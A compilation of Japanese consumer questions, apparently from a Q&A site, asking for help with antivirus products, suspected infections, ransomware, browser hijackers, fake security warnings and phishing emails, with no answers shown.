１．定期ウィルスチェックのためのフルスキャンを週一のスケジュールでやっているのですが、このフルスキャンに要する時間が約13時間くらいかかっています。　　かかり過ぎではないかという印象なのですが、この程度で正常なのでしょうか？　　 ２．また、このウィルスチェックに要する時間を少しでも短くするための方法・対策として、 バックアップに使っている外付けのHDD（２TBの大きさで、現在、1.1TBをバックアップ用に占有しています。　残りの８００GBは空きの状態）　について、ウィルスチェックのスキャン時に、スキャンの対象から外しておく、という方法が考えられるのですが、この方法でよろしいのでしょうか？ ３．バックアップですが、これも週一のスケジュールでやっていまして、バックアップをやってからウィルススキャンをやる、という手順でやっています。　　バックアップするファイル数ですが、約190万ファイルくらいのようです。 ４．使用しているパソコンは、ノート型で、 ・2010年に購入したもの、・Win7、　・Core i7、　・RAMエリヤは８GB、 ・内蔵HDDのサイズは５００GB（Cドライブとしては、現在１２０GB位占有している状況）、　 のパソコンです。 また、ウィルスチェックに使っているソフトは、マカフィー製で、パソコン購入時から、ずっと使い続けています。 以上、ご指導の程、よろしくお願いいたします。
「アンチウイルスが死んだとして、今後はどうなる？」と「windowsアプリストアは詐欺アプリがいっぱい」という記事を読んで思いました。 有料で性能が高いセキュリティソフトでも防御率は4割程度しかないことを考えると、そもそも論としてwindowsマシンをインターネットに接続すること自体が誤りではないですか？ ネット用はiPadやAndroid機で、windowsPCはオフライン専用として使い分けるのがベターでないですか？ でオフライン専用ならMSEが低コストだし十分ですよね？ windowsは有料セキュリティを入れようがどうやっても安全性を保てない、という考えにどこか間違ってるところがあったら教えてください。
スマホのウイルスで、勝手にカメラを起動させて撮影してしまうというウイルスがあると聞きました。 そのようなウイルスが入ってしまっていたらとても怖いです。 ウイルス対策アプリを入れていれば大丈夫でしょうか。 ちなみにウイルスバスターを使っています。 それと、ウイルス対策アプリを入れていればいつそういうようなウイルスに感染したかなど詳しくわかりますか？ 回答よろしくお願いいたします。
お世話様です。 マカフィー使用していますが、ときおり画面右下に 「他のデバイスが接続されています」、といった表示が出ます。 IPアドレスもそこに記載されていますが、すぐにその表示は消えてしまいます。 PCにつないでいるのはマウスとネットのケーブル以外何もつないでいません。（ノートPCのため） なにか悪さをされているのではと気になっています・・・ これはどういう状況なんでしょうか？ ちなみにWinodows8です。
誤って後から怪しいソフトだと知ってインストールしたしまったんですが アンインストールができません プログラムからアンインストールしようとするとインストール画面がでてこまってます 消し方がわかりません
夫が使っていたパソコンが2台、Windows 7とVistaがあります。 急に亡くなってからまもなく1年が経ちます。 私はこの2台について生前はノータッチでしたが、現在は7を中心に使っています。 セキュリティソフトは7の方にMcAfeeのインターネットセキュリティが入っていたのですが、 まもなく期限が切れるとメールがきました。 1～3台用で代金を支払い、受信したメールに従い操作し、7の方は無事にダウンロードし、 1年後まで有効な状態になりました。 Vistaの方も同じメールアドレスを使っているので同じように操作しようとしたところ、上手くいきませんでした。 確かにMcAfeeが入っているようなのですが、マークをクリックしてもプログラムから入ろうとしても 白い枠が出るだけで起動しません。 そのため実際に現在有効な状態になっているのかもわかりません。 IEではログインの画面から進んでくれない状態でしたので、パソコンに入っていた Safariでネットにつないでみたら、サービスパックが入っていないためにダウンロードできないと 表示がありましたた。 Windows Upadeteの履歴を調べたらSP1が自動でインストール出来ていなかったようです。 もうSP1はインストールできないのでしょうか？ VistaにMcAfeeのインターネットセキュリティをダウンロードするには どのような手順でどうすればいいのでしょうか？ 不慣れなため難しいことはまったくわからず困っています。 宜しくお願いします。
現在windows8のＰＣを使用していますが、右下のツールバー（？）のところにいつもポップアップのようなものが出てまして、「お使いのパソコンは危険な状態です。マカフィーインターネットセキュリティスイート」と出ていますが、これってあぶないのでしょうか？？購入してからまだ半年ほどですが特に自分でセキュリティソフトなどを入れた記憶もないのでほんとに危険な状態なのかと心配になりまして。。。
ファイヤーフォックスを立ち上げていますと急に新しいタブがでてきて 「偽装サイトとして報告されています！ この Web ページ (static.littleleaguestandings.com) は偽装サイト(フィッシング詐欺サイト)であると報告されており、セキュリティ設定に従いブロックされました。 偽装サイトではあなたが信頼しているサイトに見せかけた偽のページを作り、利用者の個人情報やクレジットカード番号などを盗み取ろうとします。 このページで個人情報を入力してしまうと、なりすましや詐欺などの被害に遭う恐れがあります。」 とでてきます。ウイルスチェックはいくつかしてみました。ファイヤーフォックスは初期化しました。アドオンは二つしか入っていませんがふたつとも無効になっています。 ウイルスでしょうか？どのように対処すればよろしのでしょうか。
読んでいただいてありがとうございます。よろしくお願いします。 このたび初めてインターネットを始めようと思い、auのWi-Fi WALKER WiMAX 2+ HWD15を契約しました。 たぶん無線LANというものだと思うのですが…そういった事に疎いので全くわかりません。 （家は田舎の山奥の為、光なんとか？やADSLは無理だと言われました） パソコンは、以前からワードやエクセルを勉強するためだけに持っていた（ネットには繋いだことがない）ノートパソコンを使おうと思っています。 そこで、ネットに繋ぐまえに、ウイルス対策ソフトをいれたほうが良いと聞いたので電気屋でウイルスバスターを購入しました。 インストールしようと思ったのですが、メールアドレスを登録するようになっており、メールアドレスが分からずどうして良いか分かりません。 携帯で調べた所、“プロバイダーと契約した時に貰うもの”とあったのでauに聞いてみたのですが、“ありません”と言われました。 そもそもウイルス対策ソフトを入れる必要はなかったのでしょうか？ でも不安ですし、せっかく買ったので入れたいのですが… メールアドレスを入力せずにインストール出来るものなのでしょうか？ それか、他に方法があるのであれば手順を教えていただけませんでしょうか。出来れば馬鹿なので分かりやすく教えていただけると助かります。宜しくお願い致します。 もし同じ質問や回答があった場合は私の確認不足ですみません。その時は検索ワードを教えていただけると助かります。 本当に自分の無知を情けなく思います。回答宜しくお願い致します。 ここまでの長文、読んでいただき、ありがとうございます。
ウイルス対策ソフトの重複インストールがいけないのは、互いに相手をウイルスとみなしてしまうからなんですか？ 詳しい方解説お願いします。
IPアドレスから住所特定って出来ますか？
http://detail.chiebukuro.yahoo.co.jp/qa/question … 上記質問におけるBA者の説明は正しいでしょうか。 よろしくお願いいたします。
クイックスキャンが遅くないですか？ノートン３６０より遅いです。 ブラウザなど他のプログラムは閉じています。 無料だからか？ 回答お願いします。 OSはWIN8.1です
ウィルスに感染してしまい 画像ファイルなどがBitCryptによって暗号化されてしまいました ウィルスについてはHDD交換OS再インストールにて解決したのですが 暗号化されたファイルの戻し方がわかりません ご教授願います
よろしくお願いします。 PC初心者です。以下のことを少し心配しています。 ソフトの中で、ID&PWを記憶させるフリーソフトなどがあるかと思います。 便利そうで、使ってみたいとも思うのですが、昨今の「セキュリティ問題」で、ウィルスによって 「PWを盗まれた」ようなニュースなどを耳にしますと、そのソフトに、まとめて「各種ID&PW]を 保存していた場合に、そのソフトが、ウイルスがらみのソフトであった場合に、そのID&PWが いつの間にか外部から、抜き取られてしまう危険性が大きいようにも考えます。 初心者の妄想であればいいのですが、そのあたりのところ、専門の人から見て、 どのように考えればいいのか、アドバイスをいただければ幸いです。 よろしくお願いします。
メールを操作中、表示されました。 partnerと言う表現、今まで見たことありません。 簡単に消すこと出来ました。 2回目表示のとき、切り取りました。 もし、「今すぐ修復」を押すと、どうなると予想されますでしょうか？
オンラインゲームで遊ぼうといつものように起動した所 torojan.win32.bazon.a　がセキュリティソフトにより検出されました。 これは一体どんなウイルスなのですか？
ブラウザ・ハイジャッカーというものにかかったらしく、これまでホームとして設定していたGoogleのトップ画面がhttp://search.fbdownloader.comというページに突然変わってしまいました！ WinZipという解凍ソフトをダウンロードしたことが原因だったのでこれは即アンインストール、その後パソコンに入れているESET Smart Securityで検査してみましたが、「脅威の数０」となり何もひっかかってきません。 メニューバーからGoogleを選んで検索すれば目当てのページに行けるので通常通りパソコンを使うことはできるのですが、今後データの抜き取り等、何か深刻な支障が出るんじゃないかと心配です。原因となっているファイルをきちんと削除するためにはどうすればよいでしょうか？どうぞ宜しくお願いいたします！ ※OSはWindows7です。
子供のスマホにノートンファミリーをインストールしてWEBをフィルターしています テストは何度も実施してフィルターされるのを確認したのですが 数日たってスマホを確認すると全てのサイトがフィルターをすり抜ける状態になっています。 色々調べましたが未だ原因がわかりません。子供は何も知らないと言います。 すり抜ける設定又はすり抜けをほう助するソフトなど有りますでしょうか。 原因としてどのようなことがかんがえられますでしょうか。
パソコンにNorton Internet Securityをインストールして使っていますが、ある日突然有効期限が約100日あるのに、「有効期限が切れました。延長してください。」という表示が出て、実際にソフトを起動させると期限切れの状態で、無効の状態になっていました。 あわててノートンアカウントで確認すると、有効期限は100日後だったのでダウンロードボタンを押すと有効化できていました。 こんなことが起きるのは何かあったのでしょうか。全く原因が分かりません。 分かる方がいらっしゃいましたらご回答お願いいたします。
　弟がyoutubeで動画を見ていたら 何かがダウンロードされて・・・・ 「アダルトコンテンツのご利用ありがとうございます」という 「ご利用通知」がでてきます・・・ 親には相談しました・・・ しかし、削除方法がわかりません・・・ 他の　Q&A　を調べて del＿1cw バッチファイルを使っての方法が出てきました・・・ しかし、何も捕らえません・・・・ 僕が考えるのは　おそらく、ワンクリック式詐欺ウイルスだと思います・・・ 人を脅かし・・・　60時間以内に7万円を振り込ませる厄介なウイルスだと・・・ 是非、削除方法を教えてください・・・ 写真を載せておきます・・・ 悪いことではないので、通報しないでください！！
自分のパソコンのOSはWindows7で64Bitです。 現在ウィルスバスター2012クラウドを使用していますが １　ウィルスでないファイルを誤認識する ・・・・いままでウィルスでなかったDVD-ROMに格納されていたファイルを突然ウィルスと判断する これは、ゲーム関係のファイルでゲームのDVD認証ファイルが圧倒的に多いです。 ２　広告が頻繁に表示され（これは改善されたが）、更新間際になると３～４日の間隔でホップアップ表示されうっとうしい とのことで他のソフトに切り替えたいです。 いままでESETを購入したことがありましたが、 グラフィックドライバーファイルやItuneのインストールファイルのダウンロード等に失敗（９９％までダウンロードできるのだがそこで停止したり、ダウンロード自身に失敗する）などで、当時この会社でも認識していた問題で解決されたのかどうか・・・ ということで、使いたくありません。 その他のソフトでおすすめってありますか？ できれば、ファイルを誤認識しない。Windowsの環境等を破壊しない。インターネットに障害がでないなどのものがいいです。 また、自分自身フリーのアンチウィルスソフトより金を出してもしっかりしたものがいいです。
norton Internet　securityを入れています。 XPの時は毎日午前３時に自動的にスキャンが実行されるようになっていました。 たまに、ネット使用中にノートンが起動する事もありました。 現在はWindows8.1で、右下のnortonのアイコンから吹き出しが出て、「脅威を解決しました」といったメッセージが出ていましたが最近出ません。バツ印が付いていたのでそのせいでしょうか。 現在はバツ印が自然に消えたのでまた吹き出しが出るでしょうか。 XPの時のように自動でスキャンしてくれると便利なのですが設定がどうなっているかを見る方法を教えて下さい。
公的な機関が主催するパソコン操作教室で、動画制作の技術を学びました。 そこで講師がアドビ―・プレミア―・エレメンツ（８０００円程）を使ってのやり方を教えてくれました。やってみると、Windows　ムービー・メーカーとよく似たやり方でした。違うのは複数の映像や音声を重ねることができるなどの、専門的なことができることでした。ただし、それなら無料ソフトで出来るものもあるので、アドビ―製品を買わなくても良いのではないかと思っていたら、「無料ソフトは、ダウンロードの際にウイルスが付くものが多く、やめた方が良い。一旦感染するとｐｃ内のすべてのデータが感染する。映像作りは多くがエッチ映像と関わっているから、ウイルスを広めたい人はそこを狙う」などと言われました。本当でしょうか？ 映像ソフトを使いたい人はエッチ目的が多いのでしょうか。そして、今では誰でもウイルス対策ソフトを入れているので、そこでブロックしてくれるのではないでしょうか。
macbook air2012を使用しており、先日ダウンロードしたファイルを開いたところ「Codek-M」というウィルスがセキュリティソフトによって検知されました。 セキュリティソフトは「sophos」の無料版を利用しており、「脅威が１つ見つかりました」との文言で隔離マネージャにファイル名が表示されておりましたが、その後Finderにファイル名を表示→ファイルをゴミ箱に削除→ゴミ箱を空にしたところ、隔離マネージャから表示は消え、ローカルボリュームの検索をかけても脅威は見つからなくなりました。 現在は通常通りネットは利用できていますが、 1.このウィルスは具体的にどういった不利益をもたらすものでしょうか？ 2.sophosによって検知されましたが、PCがウィルスに感染したということではないのでしょ　うか？ 3.隔離マネージャからも表示が消え、検索にかからないということはウィルスは削除できたと　いう認識でよろしいでしょうか？又は、何か特殊な操作が必要でしょうか？ 　又、操作が必要でしたら、手順を詳しく教えていただけますでしょうか？ 誠に恐れ入りますが、詳しい方おりましたらご教授頂けますと幸いでございます。 よろしくお願い致します。
yahoo bb セキュリティ　Ｐowered　by Symantec Plus を契約してＰＣ（Windows7）に導入して使っていたのですが、現在使えなくなってしまいました。 「Norton 360 Online　を開く」をクリックしても「エラーを特定できません」と表示されます。 その先には進めない状態です。非常に困っています解決法を教えていただけませんか。
OSがVistaのホームプレミアムSP2でMicrosoftSecurityEssentialsとWindowsファイアウォールを併用しております。ファイアウォールを無効にしてMicrosoftSecurityEssentialsのみをセキュリティソフトとして常駐稼働しておきたいのですが、大丈夫なものなのでしょうか？またMicrosoftSecurityEssentialsのみを使用してファイアウォールを無効にした場合に通知領域に表示されるファイアウォールのアイコン（赤に✖）を表示させないように設定するにはどのようにしたらよいのでしょうか？宜しくお願いいたします。
パソコンが異様に重いのでALYacというファイヤウォールソフトを使用したところトロイの木馬が圧縮ファイルに見つかりました。 これらの駆除方法を教えてください。 一度解凍する必要はあるのでしょうか。 もし解凍するとしてどのように駆除するのでしょうか。 初心者ですので一から教えてください。 ご回答よろしくお願いします。 他に必要な情報がございましたら、お手間をおかけしますが質問ください。
windows8　６４Bitを使用しています。 ブラウザは　クロムです。 どうやらインタ－ネットの接続が切れた時に、これが起こるようなのですが・・。 新しいタブが勝手に開いて、このリンク先に誘導されます。 http://go.microsoft.com/fwlink/?LinkID=・・・ そして、以下のような画面になります。 【　The requested URL '/fwlink/' was not found on the RomPager server.　】 オンラインの時は、以下のページに誘導されます。 http://www.bing.com/ タブには　オレンジの「ｂ」のアイコンに、　Bing　と書いてあります。 これは、ウイルスか何かなのでしょうか？ これを止めるためには、一体どこの設定をいじったらよいのでしょうか？　
パソコンがウイルスに感染しているかもしれません。 昨日メールをチェックしていたら、口座を凍結しますというメールがあったので、そのURLをクリックしました。 すると、メンテナンス中…と書かれたページが開きました。 おかしいと思いすぐ閉じて、AVGのスキャンをしました。 結果は何もなかったのですが、今日パソコンを開くと、Identity Protection検出のところに1つ感染というのが出てきました。 その後全コンピュータのスキャンをしましたが何もありませんでした。 これはパソコンがウイルスに感染したというお知らせなのでしょうか？ その場合何をすればいいのでしょうか？ もうこのパソコンは使えなくなるのでしょうか？ リカバリーすればいいのでしょうか？ パソコンはWindows8です。 何もわからず混乱しております。 お分かりの方、アドバイス等どうぞよろしくお願いいたします。
ヤフーメールに知らない人から添付ファイル付きのメールがたまに届くのですが、本文を読んだだけでも感染の可能性はありますか？ 　 今までは、添付ファイルのないメールは読んで、ファイル付きのは本文も見ずに削除してます。
ｌenoｖo Ｂ590を購入しました。 マカフィーの無料期間が終了してしまいまいた。 ＰＣについてまったくの素人で、ウィルス対策をどうしていいのかわかりません。 インターネットもネット検索・買い物くらいです。 安くて安全なウィルス対策ソフトを教えてください。
Nortonのウィルスチェックするときってネット接続したままじゃないとダメですか？ McAfeeのときはネット接続してから行ってくださいと書かれてたので・・教えてください
先に、使用プラウザは、Mozilla Firefox 31.0になります。 最近、添付画像のように、［Ads by save net］が頻繁に表示され、常に、×ボタンを押さなければ 非表示になりません。 ちなみに、画像右上の緑枠は、何か関係があるのでしょうか？ 何方かご存知の方おりましたら、教えていただけないでしょうか？ よろしくお願いいたします。 添付画像についての通知ですが、右上の緑枠を拡大したものを真下の表示しております。
すいません、セキュリティーに詳しくないので宜しくお願いします。 0-day Exploitに対しては対抗策はないのでしょうか。 詳しい方お願いします。
Windows 8.1 Windows Defenderはノートンより性能は劣りますか？
ウィルス感染でパソコンが物理的に壊れる事はあるでしょうか。 Windows8を購入し、ネットサーフィン専用にしています。 メールは全く使わないし、ネットから商品購入もしないので、ウィルス対策ソフトはインストールしていません。もしウィルス感染にあったら、購入時の工場出荷状態に戻したいと思っています。 尚、文書作成はネット未接続のXPを使っています。 心配するのは、ウィルス感染でパソコンが物理的に壊れる事だけです。 間違っているでしょうか？
無料ウイルス対策ソフトとして、キングソフト2012版を使っています。 ウイルス情報は自動で毎日最新に更新されています。 それならばわざわざ新バージョン(2014版)に替える必要はないですか？ それとも新バージョンが出るたびに、古いものはアンインストールして、いつも最新版をインストールした方がいいのですか？ どっちが適切なのかわからないので教えてください。
Win8.1を使用しています。 セキュリティソフトのディフェンダーダウンロードのサイトが見つかりません。 ご存知の方URLを貼り付けてご指導ください。
現在、セキュリティ対策としてウイルスバスターだけを導入していますが これだけで、スパイウェア対策やファイアウォールとしての 機能は十分でしょうか？ それとも、他に何か導入したほうがいいでしょうか？
MSEの防御力はノートンやカスペルと比べて劣るようですが、多くの人があれを使っていてシェアがそれなりにあるのに問題が起きないのはなぜでしょう。 そもそもアンチウイルス対策ソフトの比較テストやセキュリティソフトのベンチマークの項目は現実に即しているのですか。 確定情報はもちろん、予想・推測でもいいので教えてください。
セキュリティソフトをどれにするか、ESETとNortonで迷ってます。 そこで質問なんですが、 ウイルス/スパイウェア対策とファイアウォール、 この2点においてはどちらが優秀だと思いますか？
使わなくなったＸＰパソコンの個人情報などのデータを消去し ウイルスに感染しても特別問題ない状態なら ネット回覧などに使用していても問題ないでしょうか？ 問題ないとしても注意した方がいいことなどありますか？ 宜しくお願いします。
WINDOWS7,　IE-11でインターネット上の各種情報を　名前を付けて保存として取り込んでおりますが、以前は問題なく保存した情報を再生できていたのですが、最近のほとんどの保存ホルダーはダブルクリックすると、Ｓ字型のアイコンに変わり、ファイル名の拡張子に　。ＪＳがついていて開くと　ＪＳ　ＳＣＲＩＰＴ　スクリプトエラーと表示され、ファイルを開くことができません。どうすれば開くことができるのでしょうか？　ウイルスでフィアイルがダメになって仕舞ったのでしょうか？教えてください。よろしく。
現在PCのセキュリティソフトとして、Avira Free Antivirusを使用しています。 ところが、最近右クリックからのスキャン、メイン画面からのスキャンともに管理者権限が必要となり、ユーザーアカウント制御の画面が表示されるようになりました。 これは皆さんそうなのでしょうか？また、解決策等あればご教授願います。 （このソフトは使い続けたいと思っているので、別ソフトのインストールは考えていません。）
F Secureに１年間の更新手続きを完了したのですが、技術的な問題が生じて解決策を尋ねようとしました。 しかし問合せフォームが英文ばかりでわかりにくいばかりでなく、必須入力として選択する項目がなにも無いので選択できません。 選択できないまま「送信」すれば「入力フォームをすべて満たしてから送信しなさい」という意味のエラーが出て送信できません。 つまりF Secureに連絡をとりたくてもつなぐことができないのです。 どなたかF Secureへの窓口を知っているひとがいれば教えてください。 しかしセキュリティを販売する会社が会社への問い合わせさえもできない状態にしておいてセキュリティ会社と言えるのでしょうか？かつてはメールアドレスがあったのに・・・、呆れてモノが言えません。
総合セキュリティソフトを探しています。 つい最近まで使用していたセキュリティソフトの提供が終了してしまい 新しく入れ替えようと思うのですが色んなレビューを見ているとイイなと 思っていたソフトがエラーが多いやバグが多い等で購入を辞めておこうなどと 思い中々買う事が出来ません。繋ぎとして公式からの無料ソフトを使って凌いでいますが 検出率の問題上なるべく早い内に入れ替えてしまいたいのです。 （念の為にF-Secure Online Scannerも入れてます） 一応、調べてはみました ・ソースネクストは検出率が悪い上、重いので無し。 ・ノートンは重いで有名、且つサポートが弱いし値段が高い ・KINGSOFTはメーカーが中国で他のメーカーなら自動駆除できるものが出来ない等 　スパイ疑惑の多い国の製品なので危ない気がする ・ESETは軽い、簡単だけど検出率がちょっと弱い 　サポート時間が短い、最適化機能が無い（メモリの開放など） ・カペルスキー2014は性能はピカイチ！ですがバグや 　実行アプリケーションの制限によりアプリソフトが動かなくなる等のエラーやバグが多い 　インストした事で通常のWebサイトが見れなくなる事など 　などと色んなサイトで見てきました。 　全てが全て出るとは思いませんがそれでも気になる所です。 個人的にはカペルスキー2014が良いと思ったのですが不具合が多いようなので思案中。 そこで皆様が使っているソフトで良いものを教えてくれると助かるのですが上にも書いた様に 問題の多いソフトも多くあるのでそういうのでない物を教えて下さい。 PCの使い道はネットショッピングが多いです。Youtubeを多く見ます。 動画の編集などもします。 PCはデスクトップ『lenovo H320 76981KJ』 OSはWin7-64bit CPUはCore i5-650です 今まで使ってきたソフトはV3 Liteというものを利用してきましたが先月末で終了しました。 軽い上、検出率もそこそこ良かったのに残念です。 http://www.ahnlab.co.jp/product_service/product/ …
GOM　PLAYERウイルス感染について質問します。 アップデートでなく、初めてダウンロードする場合は、ウイルス感染という事例は、なかったのでしょうか。 現在（２０１４．７．２２）において、GOM　PLAYERのアップデートでなく、初めてのダウンロードは、安全なのでしょうか。
よくウェブサイト会員登録時「パスワード使い回し」をして、ハッキング被害に合うという。 各社はパスワードの使い回しを止めて、パスワードを変更するよう呼びかけている。 ただ、複数のウェブサイト登録していると、アクセスする時当該パスワードを覚えきれずエラーで跳ねかえされる事がある。 手帳に記録しているが、紛失したり盗まれると悪用される恐れがある。 パスワードを一元管理できるソフトウェアがあればいいのだが…。 ご存知の方、教えてください。
頻繁にSorry,this page is temporarilr unavailable　という表示がでてきます。 なにか操作しているときにでてきます 表示されないようにできないでしょうか。
お世話になります。 インターネットをしていたところ、ブラウザに『感染しています。直ちにインストールを！』 などのメッセージが出て、RegCleanPro(Mcafee)、AdvancedSystemProtectorなどの ソフトが入ってきて、継続して除去するためには、入金しろとの画面が出てきます。 明らかに怪しいと思うのですが、これは安全なソフトなのでしょうか。 会社名には、Sysweak Softwareとありますが、とても怪しげです。 よろしくお願いいたします。
Ｗｉｎｄｏｗｓ７です。ＰＣ購入時にプレインストールされていたマカフィーのウイルス対策ソフトを使っていますが、無償期間が間もなく終了します。ＸＰの時には、Microsoft Security Essentials　を使っていました。 今度も特に問題なければ無償で提供されている「Microsoft Security Essentials」を使いたいのですが、どんなもんでしょうか？やはり、サードパーティのウイルス対策ソフトが優れているのでしょうか？
いつ頃からかわすれましたが　VISTAを起動するたびに、PhishWallのアップデートを通知する画面が表示されるので無視していますが、鬱陶しい現状です。 「PhishWallのアップデー」を検索したら、インストールの不具合が原因らしく 新たにインストールしなおせば解決できるらしいことがわかりました。 PCの使用では、危険なサイトはクリックしないように気をつけていますが、安全のため 厳密なウイルスの定義はわかりませんが、いわゆるウイルス対策としてウイルスバスタークラウドをインストールしてあります。 PhishWallを新たにインストールするより一層のことアンインストールしてしまおうかと 思いますが、どのような危険が予想されますか。
はじめまして、ipadカメラロールに関する質問です。どうぞよろしくお願いします。 ipadのカメラで写しカメラロール上に保存された画像を、Gmailから数枚友達にお送ったのですが、覚えのないアダルト画像が一緒に添付されていたそうです。その話を聞き、すぐに最新のios 7.1.2にアップデートをし、再度同じものを相手に送ってみましたが、やはり同じ画像が添付されるようです。友達のブラウザはｘｐで、「ピクチャービュー」という機能で開いて見たそうです。試しに私の別のアドレスへ同写真数枚を送り、Win7で開いてみたところ、やはり覚えのないファイルが添付されていましたが、Win7では警告が出て開くことは出来ませんでしたが、恐らく友達に送られたものと同じ画像だと思います。怖くなり、カメラロール内の写真全てを削除し空にしてみました。そして、再度新たに数枚写真を写し、メールで送ってみましたが、やはり覚えのないファイルも一緒に添付されてしまいます。 数ヶ月まえに無料アダルトサイトを見たことがあるのですが、考えられる原因はこれです。その時に、カメラロールの中に隠しファイルみたいなものを勝っ手に組み込まれてしまったのでしょうか。勝手に画像を添付されてしまうのをどう対処すればよいのかどなたか教えて下さい。 どうぞよろしくお願いします。
Nortonですが、いつもならば緑色の○印にチェックマークがついている状態(正常)になるのですが、突如として赤い丸印に×マークが点灯してしまい、このパソコンはウイルスから保護されていません、という趣旨の注意書きが点灯してしまいます。 パソコン画面には、3035,6エラーなる警告画面が表示され、Norton以外の他のすべてのウイルスソフトを削除するように指示が出るのですが、そのようなソフトはインストールしていません(アプリケーションの追加と削除で何度も見直しましたが、ノートン以外のウイルスソフトはありませんでした）。 ライブアップデートを繰り返すと、一旦は正常な表示が出る(緑○印にチェックマーク)のですが、暫くするとまた赤○に×マークが出て、同じことの繰り返しになっています。 一応当方でも『ノートンパワーイレイザー』なるソフトを試したところ、『navex15 sys did not load driver』というファイル?が怪しいのではないか、という所までは分かったのですが、それ以上は全くお手上げの状態です。 パソコンには明るくないので、どなたかご教示いただけましたら幸いです。 使用OS:Windows7 Professional パソコン型番:HP　Pavillion Elite HPE570
掲題の件 ウイルスに感染して操作不能になりました。 ワクチンソフトかなにかないでしょうか。 誰かたすけてください。
パソコンを起動する度に、セキュリティソフト(KINGSOFT Internet Security2014)が、 下記のウイルスを検出し、隔離しましたと出ます。 [トロイの木馬型ウィルス] Win32.Troj.Generic.a.(クラウド分析) 詳細：トロイの木馬型ウィルスです。パソコン内の個人情報を無断で外部に送信します。 場所：I:\Windows\PE_Rom.dll サイズ：1024.00KB(1048576バイト) それで、隔離したウイルスを削除した後で再スキャンして、「安全です」と表示されるのですが、 パソコンを切って、また再起動すると、また同じように警告が出ます。 パソコンを立ち上げる度に、毎回この繰り返しです。 (1)パソコンを立ち上げるとウイルスを発見、隔離しましたと警告 (2)隔離したウイルスを削除し、再スキャン→安全ですと表示 (3)電源を切り再起動すると、また(1)に戻り、延々とこれのループ もう面倒臭くなって無視しようとも思うのですが、 「トロイの木馬型ウィルスです。パソコン内の個人情報を無断で外部に送信します。」と説明が有ります。 パソコンを起動している間は、モデムのアクセスランプが、ずっと高速点滅していてます。 ブラウザだけでなく、クラウドサービスやスカイプ等のデータ送受信しそうなプログラムは全て終了しているのですが、 何かデータの送受信をやっている様で、誰に何のデータを送っているのか判りませんが、気持ち悪くて無視も出来ません。 それで必要な時以外は、モデムの電源だけ落として強制的に回線を切断して対処してますが、 このしつこいウイルスを抜本的に削除する方法は無いのでしょうか?
無料のアンチウイルスソフトのお奨めは何でしょうか？　　 ネットに繋げてない親戚のPCが古くなった為 OSやアプリケーションのバージョンアップを頼まれ預かる事となりました。 なので無料のアンチウイルスソフトで構いません。 他人のPCを感染させては不味いので、最初に導入してから行う予定です。 駆除率が高い方が良いです。
ウイルスバスタークラウド 7.0.1240 で、全体検索中に、13％程度まで進んだところで電源ダウンして異常終了します。 半年以上まえから、数時間検索した後シャットダウン（異常終了ではない）していて、終了後シャットダウンにチェックを入れてないのにシャットダウンするとサポートに問い合わせしましたが、不明のままうやむやで終わっていました。短時間でシャットダウンするのを発見したのは、7月4日（週一定期チェック設定してその間放置していますので、正確にはもう少し前かもしれません）です。 但し、クイックスキャンは正常終了します。 これまでに施した対策は以下です。 ・　一旦アンインストールして、インストールしなおしました。 ・　トレンドマイクロのサポートに連絡して、指示された以下を実施しましたが、異常なく正常終了しましたが、改善はされません。 　　1.ディスクのクリーンアップ 　　2.スキャンディスク 　　3.デフラグ ・　サポートの指示で「msinfo」のデータを送りましたが、1週間しても返事が来ず、メールで確認してもなしのつぶてです。 独自に調べた中で、「kernel-power41（カーネルパワー41）」の存在チェクをしたら、重大イベントが 1ありました。 原因と対策について、ご指導いただければ幸甚です。 トレンドマイクロの対応のなさと、このままでは安心してネット接続を継続出来ないので、ソフトを変更しようかと考えていますが、マカフィーが評判が良いようですが、推奨ソフトも教えていただけます様お願いします。
Ｗｉｎｄｏｗｓ 7　Home Premium SP1 Ｎｏｒｔｏｎ 360　使用です。 他に Spybot - Search & Destroy と SpywareBlaster　　を入れています。 最近、何日かおきにノートンの自動ウィルススキャナで Trojan.Hachilemがウィルススキャナによって検出されるようになりました。 そうするとノートンはパソコンの再起動を促し 再起動してセキュリティ履歴を見ると検疫済みとなっており 推奨する処理は「解決しました。対応の必要はありません」となって 感染ファイルは「削除しました」となっています。 今回の感染ファイルは以下でしたが その都度tmpの前にある数字は０００で始まりますが数字は変わります。 C:\program files(x86)\internet explorer\00019106.tmp C:\program files(x86)\internet explorer\00025026.tmp C:\program files(x86)\internet explorer\00030838.tmp しかしながら ノートンの推奨する処理は「解決しました。対応の必要はありません」確認したあとに C:\program files(x86)\internet explorer　を見てみると 00019106.tmp、00025026.tmp、00030838.tmpは残ったままです。 それで再度一つずつファイルをスキャンするとファイルは無くなります。 下記URL参考（Trojan.Hachilem - 駆除方法）に http://www.symantec.com/ja/jp/security_response/ … レジストリを確認しましたが "hachimitsu-lemon" = "hachimitsu-lemon.exe" は存在していませんでした。 影響を受けるシステム: Windows 2000, Windows 95, Windows 98, Windows Me, Windows NT, Windows Server 2003, Windows XP もしかして　Trojan.HachilemはWindows 7には影響しないのですか？ それとも Trojan.Hachilemのファイルがダウンロードされたがノートンが検出して すぐに削除してくれたということなのでしょうか？ パソコンを起動していて　アダルトサイトから お金を支払えというような広告もウィンドウも立ち上がったりはしません。 故意にアダルトサイトを閲覧したことは無く どういった経緯でTrojan.Hachilemが当方のパソコンに侵入してきたのかもわかりません。 Norton 360を最新にしてパソコンのフルスキャンもしました。 Spy-botも入っているのでスキャンしましたが いずれも何も検出されませんでした。 このまま放っておいても大丈夫でしょうか？ よろしくお願い致します。
アンチウィルスとウィルスバスター・クラウドの長所と短所を教えてください。
